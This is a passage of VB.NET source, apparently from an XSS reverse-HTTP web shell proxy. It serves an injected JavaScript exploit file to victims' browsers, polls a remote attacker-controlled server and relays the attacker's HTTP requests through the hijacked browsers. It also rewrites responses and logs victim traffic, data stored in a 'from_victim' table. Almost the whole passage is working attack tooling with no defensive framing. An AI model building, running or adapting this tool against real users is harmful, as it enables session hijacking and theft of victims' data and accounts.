                    cmd.Parameters.AddWithValue("@trace", exp.StackTrace)
                    cmd.ExecuteNonQuery()
                    cmd.Dispose()
                    db.Close()
                Catch e As Exception
                    MsgBox(e.Message.ToString, vbCritical)
                    Application.Exit()
                End Try
                End Try
        End Sub
        Public Sub respond_to_proxy()
            cmd.CommandText = "SELECT vid,rid,data FROM from_victim LIMIT 1"
            Dim result As SQLiteDataReader = cmd.ExecuteReader()
            Dim check_loop As Boolean = True
            While check_loop
                check_loop = False
                If Not result.HasRows Then
                    send_200_withNullBody()
                    Return
                End If
                result.Close()
                result = cmd.ExecuteReader()
            End While
            Dim body As Byte()
            Dim _vid As String = ""
            Dim _rid As String = ""
            If result.Read() Then
                body = Encoding.UTF8.GetBytes(result("data").ToString())
                _vid = result("vid").ToString()
                _rid = result("rid").ToString()
                send_200_withBody(body)
            End If
            result.Close()
            If _vid.Length > 0 AndAlso _rid.Length > 0 Then
                cmd.CommandText = "DELETE FROM from_victim WHERE vid=@vid AND rid=@rid"
                cmd.Parameters.AddWithValue("@vid", _vid)
                cmd.Parameters.AddWithValue("@rid", _rid)
                cmd.ExecuteNonQuery()
            End If
        End Sub
        Private Sub send_200_withBody(ByVal body As Byte())
            Try
                Dim hlres As HttpListenerResponse = hlc.Response
                hlres.StatusCode = 200
                hlres.AddHeader("Access-Control-Allow-Origin", "*")
                hlres.AddHeader("Access-Control-Allow-Methods", "POST, GET, OPTIONS")
                hlres.AddHeader("Cache-Control", "no-cache")
                hlres.OutputStream.Write(body, 0, body.Length)
                hlres.Close()
            Catch exp As Exception
                Dim eid As String = "server_requesthandler.cs - 2"
                Dim db As New SQLiteConnection("data source=db.s3db")
                db.Open()
                Dim cmd As SQLiteCommand = db.CreateCommand()
                cmd.CommandText = "INSERT INTO exceptions (eid,msg,trace) VALUES (@eid,@msg,@trace)"
                cmd.Parameters.AddWithValue("@eid", eid)
                cmd.Parameters.AddWithValue("@msg", exp.Message)
                cmd.Parameters.AddWithValue("@trace", exp.StackTrace)
                cmd.ExecuteNonQuery()
                cmd.Dispose()
                db.Close()
            End Try
        End Sub
        Private Sub send_200_withNullBody()
            Dim body As Byte() = New Byte() {}
            send_200_withBody(body)
        End Sub
        Private Sub send_js_exploit(ByVal filename As String, ByVal serverUrl As String)
            Try
                If File.Exists("js\e1.js") Then
                    Dim sr As StreamReader = File.OpenText("js\e1.js")

                    send_200_withBody(Encoding.UTF8.GetBytes("var sotf_server_url=""" & serverUrl & """;" & vbLf & sr.ReadToEnd()))
                    sr.Close()
                Else
                    send_200_withNullBody()
                End If
            Catch
                send_200_withNullBody()
            End Try

        End Sub
        Private Function canRespond() As Boolean
            Try
                If core.proxy_loopback Then
                    If IPAddress.IsLoopback(hlc.Request.LocalEndPoint.Address) Then
                        Return True

                    Else
                    End If
                    Return False
                Else
                    Return True
                End If
            Catch
                Return False
            End Try
        End Function
        Private Shared Function InlineAssignHelper(Of T)(ByRef target As T, ByVal value As T) As T
            target = value
            Return value
        End Function
    End Class
    Public Class qHandler
        Private core As xss_reversehttpwebshell
        Private replace_rr As String = ""
        Private match_rr As String = ""
        Private regex_df As String = ""
        Public Sub New(ByVal _core As xss_reversehttpwebshell)
            core = _core
            Me.replace_rr = _core.replace_rr
            Me.match_rr = _core.match_rr

            Me.regex_df = _core.regex_df
        End Sub
        Public Sub run()
            While core.run
                Try
                    Dim to_sQ_count As Integer = core.to_serverQ.Count
                    Dim to_bQ_count As Integer = core.to_browserQ.Count
                    If to_sQ_count > 0 Then
                        While to_sQ_count > 0
                            Dim r As request = core.to_serverQ.Dequeue()
                            Try
                                core.requestList.Add(r.rid, r)

                            Catch generatedExceptionName As ArgumentException
                            End Try
                            to_sQ_count -= 1
                        End While
                    End If
                    If to_bQ_count > 0 Then
                        While to_bQ_count > 0
                            Dim res As response = core.to_browserQ.Dequeue()
                            Try
                                core.responseList.Add(res.rid, res)

                            Catch generatedExceptionName As ArgumentException
                            End Try
                            to_bQ_count -= 1
                        End While
                    End If
                    Dim rlist_keys As Integer() = New Integer(core.responseList.Count - 1) {}
                    core.responseList.Keys.CopyTo(rlist_keys, 0)
                    For Each key As Integer In rlist_keys
                        If core.requestList.ContainsKey(key) Then
                            Dim responder As New talker()
                            responder.core = Me.core
                            responder.match_rr = Me.match_rr
                            responder.replace_rr = Me.replace_rr

                            responder.res = core.responseList(key)
                            responder.res.hlres = core.requestList(key).hlr
                            Dim responder_t As New Thread(New ThreadStart(AddressOf responder.sendResponse))
                            responder_t.Start()
                            core.responseList.Remove(key)
                        End If
                    Next
                    Dim reqlist_keys As Integer() = New Integer(core.requestList.Count - 1) {}
                    core.requestList.Keys.CopyTo(reqlist_keys, 0)
                    For Each key As Integer In reqlist_keys
                        Dim ts As TimeSpan = DateTime.Now - core.requestList(key).startTime
                        If ts.TotalSeconds > 90 Then
                            Try
                                core.requestList(key).hlr.Close()
                            Finally
                                core.requestList.Remove(key)

                            End Try
                        End If
                    Next
                    If core.to_browserQ.Count = 0 Then
                        Try
                            Dim poller As New talker()
                            poller.core = Me.core
                            poller.match_rr = Me.match_rr
                            poller.replace_rr = Me.replace_rr

                            poller.poll()
                            If core.to_browserQ.Count = 0 Then
                                Thread.Sleep(500)
                            End If
                        Catch exp As Exception
                            Dim eid As String = "qHandler.cs - 2"
                            Dim p_db As New SQLiteConnection("data source=db.s3db")
                            p_db.Open()
                            Dim cmd As SQLiteCommand = p_db.CreateCommand()
                            cmd.CommandText = "INSERT INTO exceptions (eid,msg,trace) VALUES (@eid,@msg,@trace)"
                            cmd.Parameters.AddWithValue("@eid", eid)
                            cmd.Parameters.AddWithValue("@msg", exp.Message)
                            cmd.Parameters.AddWithValue("@trace", exp.StackTrace)
                            cmd.ExecuteNonQuery()
                            cmd.Dispose()
                            p_db.Close()
                            Thread.Sleep(500)
                        End Try
                    End If
                Catch exp As Exception
                    Dim eid As String = "qHandler.cs - 1"
                    Dim p_db As New SQLiteConnection("data source=db.s3db")
                    p_db.Open()
                    Dim cmd As SQLiteCommand = p_db.CreateCommand()
                    cmd.CommandText = "INSERT INTO exceptions (eid,msg,trace) VALUES (@eid,@msg,@trace)"
                    cmd.Parameters.AddWithValue("@eid", eid)
                    cmd.Parameters.AddWithValue("@msg", exp.Message)
                    cmd.Parameters.AddWithValue("@trace", exp.StackTrace)
                    cmd.ExecuteNonQuery()
                    cmd.Dispose()
                    p_db.Close()
                End Try
            End While
        End Sub
    End Class
    'talker
    Public Class talker
        Public core As xss_reversehttpwebshell
        Public res As response
        Public match_rr As String
        Public replace_rr As String
        Public banner_string As String
        'public talker(sotf _core)
        '{
        '    this.core = _core;//throws exception, so assigning it explicitly from the calling class
        '}
        Public Sub poll()
            Try
                Dim to_server As HttpWebRequest = DirectCast(WebRequest.Create(Convert.ToString(core.server_url) & "/proxy_poll"), HttpWebRequest)
                to_server.Method = "GET"
                to_server.Proxy = Nothing
                Dim from_server As HttpWebResponse = DirectCast(to_server.GetResponse(), HttpWebResponse)
                handleResponse(from_server)
            Catch exp As Exception
                Dim eid As String = "talker.cs - 1"
                Dim p_db As New SQLiteConnection("data source=db.s3db")
                p_db.Open()
                Dim cmd As SQLiteCommand = p_db.CreateCommand()
                cmd.CommandText = "INSERT INTO exceptions (eid,msg,trace) VALUES (@eid,@msg,@trace)"
                cmd.Parameters.AddWithValue("@eid", eid)
                cmd.Parameters.AddWithValue("@msg", exp.Message)
                cmd.Parameters.AddWithValue("@trace", exp.StackTrace)
                cmd.ExecuteNonQuery()
                cmd.Dispose()
                p_db.Close()
            End Try
        End Sub
        Public Sub requestServer(ByVal r As request)
            Try
                Dim to_server As HttpWebRequest = DirectCast(WebRequest.Create(Convert.ToString(core.server_url) & "/comm/" & r.vid & "_" & r.rid), HttpWebRequest)
                to_server.Proxy = Nothing
                to_server.Method = "POST"
                Dim s As Stream = to_server.GetRequestStream()
                Dim b As Byte() = makeRequest(r)
                s.Write(b, 0, b.Length)
                s.Close()
                Dim from_server As HttpWebResponse = DirectCast(to_server.GetResponse(), HttpWebResponse)
                handleResponse(from_server)
            Catch exp As Exception
                Dim eid As String = "talker.cs - 2"
                Dim p_db As New SQLiteConnection("data source=db.s3db")
                p_db.Open()
                Dim cmd As SQLiteCommand = p_db.CreateCommand()
                cmd.CommandText = "INSERT INTO exceptions (eid,msg,trace) VALUES (@eid,@msg,@trace)"
                cmd.Parameters.AddWithValue("@eid", eid)
                cmd.Parameters.AddWithValue("@msg", exp.Message)
                cmd.Parameters.AddWithValue("@trace", exp.StackTrace)
                cmd.ExecuteNonQuery()
                cmd.Dispose()
                p_db.Close()
            End Try
        End Sub
        Private Sub handleResponse(ByVal from_server As HttpWebResponse)
            If from_server.ContentLength = 0 Then
                Return
            End If
            Dim rs As Stream = from_server.GetResponseStream()
            Dim rb As Byte() = New Byte(4999) {}
            Dim n As Integer = 0
            Dim ms As New MemoryStream()
            While (InlineAssignHelper(n, rs.Read(rb, 0, 5000))) > 0
                ms.Write(rb, 0, n)
            End While
            If ms.Length = 1 Then
                Return
            End If
            Dim _res As String = Encoding.UTF8.GetString(ms.ToArray())
            Dim res_fields As String() = _res.Split("&"c)
            Dim res As New response()
            If res_fields.Length = 5 Then
                res.status = Int32.Parse(res_fields(2))
                res.headers = Converter.hexToBytes(res_fields(3))
                res.body = Converter.hexToBytes(res_fields(4))
            ElseIf res_fields.Length = 3 Then
                res.status = 81
                res.body = Converter.hexToBytes(res_fields(2))
            Else
                Return
            End If
            res.vid = Int32.Parse(res_fields(0))
            res.rid = Int32.Parse(res_fields(1))
            For Each header As String In Encoding.UTF8.GetString(res.headers).Split(New String() {vbLf}, StringSplitOptions.None)
                If header.Contains("Content-Type:") Then
                    res.contentType = header.Substring(13).Trim()
                End If
            Next

            res.body = processBody(res)
            core.to_browserQ.Enqueue(res)

            Dim p_db As New SQLiteConnection("data source=log.s3db")
            p_db.Open()
            Dim cmd As SQLiteCommand = p_db.CreateCommand()
            cmd.CommandText = "UPDATE log SET status=@status, headers=@headers, response_body=@response_body WHERE vid=@vid AND rid=@rid"
            cmd.Parameters.AddWithValue("@vid", res.vid)
            cmd.Parameters.AddWithValue("@rid", res.rid)
            cmd.Parameters.AddWithValue("@status", res.status)
            cmd.Parameters.AddWithValue("@headers", Encoding.UTF8.GetString(res.headers))
            If res.body.Length > 0 Then
                If res.contentType.Contains("text") Then
                    cmd.Parameters.AddWithValue("@response_body", Encoding.UTF8.GetString(res.body))
                Else
                    cmd.Parameters.AddWithValue("@response_body", Converter.bytesToHex(res.body))
                End If
            Else
                cmd.Parameters.AddWithValue("@response_body", "")
            End If
            cmd.ExecuteNonQuery()
            p_db.Close()
        End Sub

        Public Sub sendResponse()
            Try
                Dim hlres As HttpListenerResponse = res.hlres
                If res.status = 81 Then
                    hlres.StatusCode = 200
                    Dim null_body As Byte() = New Byte() {}
                    hlres.OutputStream.Write(null_body, 0, null_body.Length)
                    hlres.Close()
                    Return
                Else
                    hlres.StatusCode = res.status
                End If
                If res.contentType.Length > 0 Then
                    hlres.ContentType = res.contentType
                End If
                Try
                    Dim body As Byte() = res.body
                    hlres.OutputStream.Write(body, 0, body.Length)
                    hlres.Close()
                Catch
                    Dim _null_body As Byte() = New Byte() {}
                    hlres.OutputStream.Write(_null_body, 0, _null_body.Length)
                    hlres.Close()
                End Try
            Catch exp As Exception
                Dim eid As String = "talker.cs - 3"
                Dim p_db As New SQLiteConnection("data source=db.s3db")
                p_db.Open()
                Dim cmd As SQLiteCommand = p_db.CreateCommand()
                cmd.CommandText = "INSERT INTO exceptions (eid,msg,trace) VALUES (@eid,@msg,@trace)"
                cmd.Parameters.AddWithValue("@eid", eid)
                cmd.Parameters.AddWithValue("@msg", exp.Message)
                cmd.Parameters.AddWithValue("@trace", exp.StackTrace)
                cmd.ExecuteNonQuery()
                cmd.Dispose()
                p_db.Close()
            End Try
        End Sub
        Private Function makeRequest(ByVal r As request) As Byte()
            Dim sb As New StringBuilder("{m:'")
            sb.Append(r.method)
            sb.Append("',u:'")
            sb.Append(r.url)
            sb.Append("',b:'")
            sb.Append(Converter.bytesToHex(r.body))
            sb.Append("',ct:'")
            sb.Append(r.contenttype)
            sb.Append("',ssl:")
            sb.Append(r.ssl)
            sb.Append(",rid:")
            sb.Append(r.rid)
            sb.Append("}")
            Return Encoding.UTF8.GetBytes(sb.ToString())
        End Function
        Private Function processBody(ByVal res As response) As Byte()
            If Not res.contentType.Contains("text") Then
                Return res.body
            End If
            If core.response_rewrite OrElse core.is_ssl_rr Then
                Dim _cs As Integer = res.contentType.IndexOf("charset=", StringComparison.InvariantCultureIgnoreCase)
                Dim charset As String = ""
                If _cs > 0 Then
                    charset = res.contentType.Substring(_cs + 8).Trim()
                End If
                If core.response_rewrite AndAlso core.is_ssl_rr Then
                    If core.is_regex_rr Then
                        Return rewriter.rewriteResponse(res.body, New Regex(match_rr), replace_rr, charset, core.is_ssl_rr, banner_string)
                    Else
                        Return rewriter.rewriteResponse(res.body, match_rr, replace_rr, charset, core.is_ssl_rr, banner_string)
                    End If
                ElseIf core.response_rewrite Then
                    If core.is_regex_rr Then
                        Return rewriter.rewriteResponse(res.body, New Regex(match_rr), replace_rr, charset, False, banner_string)
                    Else
                        Return rewriter.rewriteResponse(res.body, match_rr, replace_rr, charset, False, banner_string)
                    End If
                ElseIf core.response_rewrite AndAlso core.is_ssl_rr Then
                    If core.is_regex_rr Then
                        Return rewriter.rewriteResponse(res.body, New Regex(match_rr), replace_rr, charset, core.is_ssl_rr)
                    Else
                        Return rewriter.rewriteResponse(res.body, match_rr, replace_rr, charset, core.is_ssl_rr)
                    End If
                ElseIf core.is_ssl_rr Then
                    Return rewriter.rewriteResponse(res.body, charset, core.is_ssl_rr, banner_string)
                ElseIf core.response_rewrite Then
                    If core.is_regex_rr Then
                        Return rewriter.rewriteResponse(res.body, New Regex(match_rr), replace_rr, charset, False)
                    Else
                        Return rewriter.rewriteResponse(res.body, match_rr, replace_rr, charset, False)
                    End If
                Else
                    'only is_ssl_rr
                    Return rewriter.rewriteResponse(res.body, charset)
                End If
            Else
                Return res.body
            End If
        End Function
        Private Shared Function InlineAssignHelper(Of T)(ByRef target As T, ByVal value As T) As T
            target = value
            Return value
        End Function

    End Class

End Namespace